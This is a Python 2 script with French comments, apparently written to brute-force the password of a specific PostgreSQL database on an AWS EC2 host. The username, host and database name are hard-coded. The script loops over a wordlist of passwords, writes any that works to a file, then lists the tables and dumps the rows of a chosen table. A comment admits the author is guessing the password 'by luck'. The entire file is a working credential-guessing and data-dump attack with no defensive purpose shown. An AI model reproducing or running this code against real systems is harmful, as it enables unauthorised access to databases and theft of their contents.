# -*- coding: utf-8 -*-
def attack(liste):
    import sys,time
    import os
    import os.path
    from sqlalchemy import create_engine
    from sqlalchemy import MetaData, Table
    from sqlalchemy.orm import sessionmaker
    from sqlalchemy.ext.declarative import declarative_base
    os.chdir(os.getcwd())
    fd = open(liste, "r")
    liste_pass=fd.readlines()
    print(liste_pass)
    resultat = open("password.txt", "w")

    """ j'essaie de trouve le mot de passe de la base avant 6a
    c'est un coup de chance
    """
    temp=False
    print(len(liste_pass))
    for password in liste_pass:
        try:
            provider='postgresql'
            user='qkiihiarmfvkfs'
            server='ec2-184-72-231-67.compute-1.amazonaws.com'
            port='5432'
            database='dbfskkvrlhppgd'
            connectionString = "{}://{}:{}@{}:{}/{}".format(provider,user,password,server,port,database)
            db=create_engine(connectionString)
            db.connect()
            resultat.write("Mot de passe base---->>>>>>: " + password + "\n")
            print "ok"
            metadata = MetaData(db)
            metadata.reflect(db)
            metadata.tables.keys()
            print metadata.tables.keys()
            table = raw_input("Entrer le nom de la table : ")
            admin=Table(table, metadata, autoload=True)
            sql = admin.select()
            datagrid = sql.execute()
    ##            table=()
            for row in datagrid:
                print row
            resultat.close()
            

        except:
            print("not ok")
            pass
        time.sleep(0.1)
    resultat.close()
    if fd.closed == False:
        fd.close()



    

import argparse
parser = argparse.ArgumentParser(description='Process a rack...')
parser.add_argument('lang', metavar='[lang]', type=str, nargs=1, help='type fr for french, en for english and sp for spanish')
args = parser.parse_args()
fichier = ''
if args.lang[0].lower().strip().__eq__('fr'):
    print 'fr'
    fichier = "test.txt"
if args.lang[0].lower().strip().__eq__('en'):
    print 'fr'
    fichier = "test1.txt"
if args.lang[0].lower().strip().__eq__('sp'):
    print 'fr'
    fichier = "test2.txt"

res = attack(liste = fichier)
r = open("password.txt", "r")
re = r.read()
print(re)
r.close()
